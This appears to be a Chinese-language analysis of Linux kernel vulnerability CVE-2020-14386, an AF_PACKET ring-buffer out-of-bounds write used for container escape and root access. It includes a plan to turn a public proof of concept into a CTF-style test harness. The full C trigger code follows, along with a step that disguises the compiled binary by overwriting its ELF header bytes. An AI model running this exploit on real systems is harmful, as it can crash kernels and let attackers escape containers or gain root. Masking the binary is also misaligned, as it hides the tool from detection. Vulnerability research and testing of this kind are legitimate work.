# CVE-2020-14386 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2020-14386 |
| CVSS | 8.1 |
| 严重等级 | CRITICAL |
| 漏洞类型 | Buffer Overflow |
| 影响内核版本 | 4.6 ~ 5.8 |
| 利用技术 | AF_PACKET套接字处理中的越界写入 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://github.com/chompie1337/cve-2020-14386-poc/blob/master/poc.c
- **来源类型**: GitHub

### 利用原理
net/packet/af_packet.c中内存损坏漏洞，允许容器内攻击者通过精心构造的网络数据包触发越界写入实现容器逃逸。

该漏洞的触发条件为AF_PACKET tpacket_rcv长度计算溢出。攻击者通过精心构造的系统调用序列，利用Buffer Overflow类型的缺陷，在内核空间中实现代码执行或数据篡改。

利用过程中，关键的内存操作为ring buffer越界写入覆盖相邻内存。最终的提权路径通过通过AF_PACKET OOB write修改内核数据实现提权完成，使非特权用户获得root权限。

### 关键技术点
1. AF_PACKET tpacket_rcv长度计算溢出
2. ring buffer越界写入覆盖相邻内存
3. 通过AF_PACKET OOB write修改内核数据实现提权

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: 漏洞利用链可直接覆写文件内容，适合通过写入CTF标志验证

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 创建AF_PACKET套接字，配置ring buffer
- **Phase 2 (Run)**: 发送特殊数据包触发tpacket_rcv越界写入
- **Phase 3 (Post)**: 验证提权结果、关闭套接字、清理网络状态

### Syscall日志记录
关键syscall需要记录到log-file：
- `socket`
- `setsockopt`
- `bind`
- `recvfrom`

## 改造要点

### 核心修改
1. 改造OOB利用为CTF验证
2. 添加CLI参数解析
3. 添加ring buffer清理

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`

## Original PoC Source Code

Source: https://www.openwall.com/lists/oss-security/2020/09/03/3

```c
/* Taken from https://www.openwall.com/lists/oss-security/2020/09/03/3 */
#define _GNU_SOURCE

#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>
#include <stdarg.h>
#include <net/if.h>
#include <stdint.h>


bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}


void setup_unshare() {
	int real_uid = getuid();
	int real_gid = getgid();

        if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

        if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}
}

void prep() {
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}
}

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}



int main(int argc, char **argv)
{
	int skip_unshare = 0;
	struct stat stbuf;

	if (argc > 1 && strcmp (argv[1], "skip-unshare") == 0)
	  skip_unshare = 1;
	else if (stat ("/run/secrets/kubernetes.io", &stbuf) == 0)
	  skip_unshare = 1;
	
	if (!skip_unshare)
	  setup_unshare();

    prep();

	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) );
	if (s < 0)
	{
		perror("socket");
		return 1;
	}

	int v = TPACKET_V2;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0)
	{
		perror("setsockopt(PACKET_VERSION)\n");
		return 1;
	}

	v = 1;
	rv = setsockopt(s, SOL_PACKET, PACKET_VNET_HDR, &v, sizeof(v));
	if (rv < 0)
	{
		perror("setsockopt(PACKET_VNET_HDR)\n");
		return 1;
	}

	v = 0xffff - 20 - 0x30 -7;
	rv = setsockopt(s, SOL_PACKET, PACKET_RESERVE, &v, sizeof(v));
	if (rv < 0)
	{
		perror("setsockopt(PACKET_RESERVE)\n");
		return 1;
	}

	struct tpacket_req req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = 0x800000;
	req.tp_frame_size = 0x11000;
	req.tp_block_nr = 1;
	req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}


	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	uint32_t size = 0x80000/8;
	char* buf = malloc(size);
	if(!buf)
	{
		perror("malloc\n");
		exit(EXIT_FAILURE);
	}
	memset(buf,0xce,size);
	loopback_send(buf,size);

	return 0;
}


```

